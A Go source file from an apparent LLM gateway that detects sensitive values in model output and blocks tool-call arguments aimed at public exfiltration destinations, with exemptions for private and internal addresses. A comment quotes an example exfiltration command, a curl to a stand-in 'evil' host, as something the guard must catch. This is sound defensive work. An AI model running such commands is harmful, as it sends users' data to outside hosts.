package sanitize

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"net"
	"strings"

	compliancehook "github.com/kaixuan/llm-gateway-go/domains/hooks/outputcompliance"
	"github.com/kaixuan/llm-gateway-go/domains/outputcompliance"
)

type OutputSensitiveAction string

const (
	OutputMask  OutputSensitiveAction = "mask"
	OutputBlock OutputSensitiveAction = "block"
)

// NewOutputSensitiveInterceptor must run before restoration. Model-generated
// sensitive values have no trusted provenance and are never inserted into the
// reversible input map. Unknown actions conservatively select masking.
func NewOutputSensitiveInterceptor(s *Sanitizer, action OutputSensitiveAction) *compliancehook.OutputComplianceInterceptor {
	return compliancehook.NewMandatoryOutputComplianceInterceptor(&outputSensitiveChecker{sanitizer: s, action: action}, "sanitize.output.pending")
}

// detectEgress runs the detector in ScopeEgress, which is the only scope that
// still matches address rules.
//
// This is the whole point of the split: input sanitization and plain output
// redaction both run under ScopeRedact (addresses are operational text, not
// secrets), while this guard needs the address rules because a routable address
// in a model-authored tool argument is an exfiltration *destination*. Widening
// the redaction scope therefore cannot quietly widen the egress surface.
func (c *outputSensitiveChecker) detectEgress(ctx context.Context, text string) ([]SensitiveFragment, error) {
	if c == nil || c.sanitizer == nil {
		return nil, ErrNilSanitizer
	}
	detector := c.sanitizer.detector
	if scoped, ok := detector.(interface {
		DetectScope(context.Context, string, DetectionScope) ([]SensitiveFragment, error)
	}); ok {
		return scoped.DetectScope(ctx, text, ScopeEgress)
	}
	// A pluggable Detector without scope support gets the default Detect; it
	// simply has no address rules to contribute here.
	return detector.Detect(ctx, text)
}

type outputSensitiveChecker struct {
	sanitizer *Sanitizer
	action    OutputSensitiveAction
}

func (c *outputSensitiveChecker) CheckField(ctx context.Context, tenant, label, text string) (*outputcompliance.ComplianceResult, error) {
	if c.sanitizer == nil {
		return nil, ErrNilSanitizer
	}
	if label == "__tool_fragment" {
		// Full JSON is checked at terminal/EOF; fragments may contain opaque data
		// or split escapes that cannot be interpreted independently.
		return &outputcompliance.ComplianceResult{Compliant: true, RedactedOutput: text}, nil
	}
	_, isMarker := ParsePlaceholder(text)
	if label == "__tool_json" {
		if !json.Valid([]byte(text)) {
			return &outputcompliance.ComplianceResult{Blocked: true}, nil
		}
		decoder := json.NewDecoder(bytes.NewReader([]byte(text)))
		decoder.UseNumber()
		var value any
		if err := decoder.Decode(&value); err != nil {
			return nil, err
		}
		unsafe, err := c.unsafeToolValue(ctx, value, "", 0)
		if err != nil {
			return nil, err
		}
		if unsafe {
			return &outputcompliance.ComplianceResult{Blocked: true}, nil
		}
		return &outputcompliance.ComplianceResult{Compliant: true, RedactedOutput: text}, nil
	}
	if label != "" && credentialField(label) && text != "" && !isMarker {
		marker := RedactionMarker(TypeSecret)
		return &outputcompliance.ComplianceResult{Blocked: true, RedactedOutput: marker, Issues: []outputcompliance.ComplianceIssue{{Type: "sensitive", Subtype: "credential", Content: marker, Severity: 8}}}, nil
	}
	return c.Check(ctx, tenant, text)
}

func (c *outputSensitiveChecker) unsafeToolValue(ctx context.Context, value any, label string, depth int) (bool, error) {
	if depth > maxNativeToolInputDepth {
		return false, errors.New("output tool input depth exceeded")
	}
	switch value := value.(type) {
	case string:
		if _, marker := ParsePlaceholder(value); credentialField(label) && value != "" && !marker {
			return true, nil
		}
		document := bytes.TrimSpace([]byte(value))
		if len(document) > 0 && (document[0] == '{' || document[0] == '[') && json.Valid(document) {
			decoder := json.NewDecoder(bytes.NewReader(document))
			decoder.UseNumber()
			var embedded any
			if err := decoder.Decode(&embedded); err != nil {
				return false, err
			}
			return c.unsafeToolValue(ctx, embedded, label, depth+1)
		}
		fragments, err := c.detectEgress(ctx, value)
		if err != nil {
			return false, err
		}
		for _, fragment := range fragments {
			if isNonExfiltrationFragment(fragment) {
				// 2026-10-08 minimax-m3/glm-5.3 fail-closed incident: the
				// server_ip pattern matches any IPv4, and dev tooling echoes
				// 127.0.0.1 / RFC1918 targets in model-generated commands
				// constantly. These originate from the data owner's own session
				// context and cannot be exfiltration destinations; blocking the
				// whole stream on them (regardless of the configured OutputMask
				// action) made tool-driving models unusable. Public addresses
				// keep the hard block
				// (TestGeneratedSensitiveToolOperationsAreBlocked contract).
				continue
			}
			return true, nil
		}
		// 2026-10-11：ScopeEgress 只匹配 IP 字面量规则，域名形式的外传目的地
		// （curl http://evil.example.com/collect）一律畅通。判定与 IP 侧同一条
		// 底线：默认公网可达即阻断，只豁免明确不可路由的主机。见 egress_host.go。
		// 放在片段循环之后：两套规则互相独立，私网 IP 的豁免不会被这里撤销。
		if hasPublicHostDestination(value) {
			return true, nil
		}
		return false, nil
	case map[string]any:
		if credentialField(label) {
			return true, nil
		}
		for key, child := range value {
			if compliancehook.IsOpaqueToolValue(key, child) {
				continue
			}
			unsafe, err := c.unsafeToolValue(ctx, child, key, depth+1)
			if unsafe || err != nil {
				return unsafe, err
			}
		}
	case json.Number, bool:
		return credentialField(label), nil
	case []any:
		for _, child := range value {
			unsafe, err := c.unsafeToolValue(ctx, child, label, depth+1)
			if unsafe || err != nil {
				return unsafe, err
			}
		}
	}
	return false, nil
}

// isNonRoutableAddressFragment reports whether a detected address fragment is
// a target that cannot carry exfiltration. 实际判定委派给
// isNonExfiltrationAddress，故覆盖范围以那里为准（loopback / private /
// link-local / unspecified / CGNAT / multicast），不要在本文件里重复枚举网段。
//
// 2026-10-11（245 build_seq 2531 部署后端到端实测）：类型集合里**必须**包含
// TypeInternalIP，否则 r1008 的私网豁免形同虚设。
//
// 成因是一步类型重写：DetectScope 命中 server_ip 后发现
// `address.IsPrivate()`，就把片段重写成 TypeInternalIP（detector.go）。而本函数
// 原来只对 server_ip / server_ipv6 做豁免判定，于是 internal_ip 落到 default
// 分支返回 false —— **恰好是私网地址被改成了唯一不被豁免的那个类型**，r1008
// 加固被自己的重写作废。生产用的是 YAML 检测器（带 server_ip 规则），于是模型
// 生成的 tool 参数里只要有私网地址就整条响应 `output_policy_blocked`，用户无法
// 执行任何指向自己内网的命令。
//
// 既有的 TestEgressGuardStillIgnoresPrivateAddresses 用内置 fallback 检测器，
// 而 fallback 里根本没有地址规则，所以那条判据恒真、盖不住这个洞。
func isNonRoutableAddressFragment(fragment SensitiveFragment) bool {
	switch fragment.Type {
	case TypeServerIP, TypeInternalIP, typeServerIPv6:
	default:
		return false
	}
	return isNonExfiltrationAddress(fragment.Value)
}

// isNonExfiltrationEmailFragment 判断一个邮箱形状的片段在 egress 语境下是不是
// 「明确不可路由的目的地」。
//
// 2026-10-11 生产探针实测的误阻断：email 规则把任何 user@host.tld 当成敏感值，
// 而 egress 侧对非地址类片段一律硬阻断，于是内网的 SSH/SCP 目标被整条响应
// `output_policy_blocked`：
//
//	ssh ops@10.24.7.91 uptime                        → 放行
//	ssh deploy@build.corp.internal systemctl status → **阻断**
//	scp file.txt user@fileserver.corp.internal:/tmp/ → **阻断**
//	ssh deploy@build-server.local                   → **阻断**
//	mail ops@kaixuan.com                            → 阻断（这条是对的）
//
// 注意前三行与第一行的矛盾：**同一个操作，写 IP 放行、写内网域名阻断**。判定
// 取决于写法而不是可达性——这与 dc63f19ff 修的「私网地址恰好被重写成唯一不被
// 豁免的类型」是同一类错误的镜像。
//
// 修法不是「放过邮箱」（那会让 mail/收件人形态真的外传无人管），而是把邮箱的
// **主机部分**交回主机可达性判定：内部主机放行，公网主机仍然阻断。于是
// user@attacker.io、mail ops@kaixuan.com 的阻断原样保留。
func isNonExfiltrationEmailFragment(fragment SensitiveFragment) bool {
	if fragment.Type != TypeEmail {
		return false
	}
	at := strings.LastIndex(fragment.Value, "@")
	if at < 0 || at == len(fragment.Value)-1 {
		return false
	}
	return isNonExfiltrationHost(fragment.Value[at+1:])
}

// isNonExfiltrationFragment 是守卫唯一的豁免入口：片段能否承载外传。
//
// 分派理由与形状无关——只问「这个目的地可不可路由」。地址问地址，主机问主机，
// 邮箱形状的主机部分问主机。新增片段类型时在这里补一条即可，不要在调用点分支。
func isNonExfiltrationFragment(fragment SensitiveFragment) bool {
	if isNonRoutableAddressFragment(fragment) {
		return true
	}
	return isNonExfiltrationEmailFragment(fragment)
}

// isNonExfiltrationAddress 回答「这个地址能不能是外传目的地」。
//
// 2026-10-11 批判性审计（承接 dc63f19ff）：原来的写法是枚举豁免谓词
// （loopback / private / linklocal / unspecified），这个方向本身就是错的——
// 它把「没列举到的」默认成外传，于是每出现一个新网段就复发一次同类故障。
// 已实测复发过一次：CGNAT 100.64.0.0/10（Tailscale / WireGuard 常用）与
// 云元数据 100.100.100.100（阿里云）都会让指向自己内网或 mesh 的 tool 调用
// 整条 output_policy_blocked，与 dc63f19ff 修的私网阻断是同一个用户症状。
//
// 改为反过来问：默认按公网可达处理（fail-closed 保住），只对**明确不可路由**
// 的地址放行。新增的两类都来自实测：
//
//   - CGNAT 100.64.0.0/10（RFC 6598）：net.IP.IsPrivate() 不认它，但它是共享
//     地址空间，恰恰是 overlay 网络的地址段。
//   - 组播 224.0.0.0/4：不是单播目的地，不可能承载外传。
//
// 云元数据 169.254.169.254 走 IsLinkLocalUnicast 已被覆盖，这里只补注释说明
// 它是被显式意图覆盖的，不是侥幸命中。
func isNonExfiltrationAddress(value string) bool {
	ip := net.ParseIP(strings.TrimSpace(value))
	if ip == nil {
		return false
	}
	if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsUnspecified() {
		return true
	}
	if ip.IsMulticast() {
		return true
	}
	// RFC 6598 shared address space (CGNAT)：net 的 IsPrivate 不覆盖，但 Tailscale
	// / WireGuard / 运营商级 NAT 都在这里，是典型的不该被当成外传目的地的地址。
	if v4 := ip.To4(); v4 != nil && v4[0] == 100 && v4[1] >= 64 && v4[1] <= 127 {
		return true
	}
	return false
}

func (c *outputSensitiveChecker) Check(ctx context.Context, _ string, text string) (*outputcompliance.ComplianceResult, error) {
	if c.sanitizer == nil {
		return nil, ErrNilSanitizer
	}
	fragments, err := c.sanitizer.detector.Detect(ctx, text)
	if err != nil {
		return nil, err
	}
	spans := mergeFragmentSpans(fragments, len(text))
	result := &outputcompliance.ComplianceResult{Compliant: len(spans) == 0, RedactedOutput: text}
	if len(spans) == 0 {
		return result, nil
	}
	var safe strings.Builder
	last := 0
	for _, span := range spans {
		safe.WriteString(text[last:span.start])
		safe.WriteString(RedactionMarker(span.typ))
		last = span.end
		result.Issues = append(result.Issues, outputcompliance.ComplianceIssue{
			Type: "sensitive", Subtype: string(span.typ), Content: RedactionMarker(span.typ), Severity: 8, Score: 1, Redacted: c.action != OutputBlock,
		})
	}
	safe.WriteString(text[last:])
	result.RedactedOutput = safe.String()
	result.Blocked = c.action == OutputBlock
	return result, nil
}
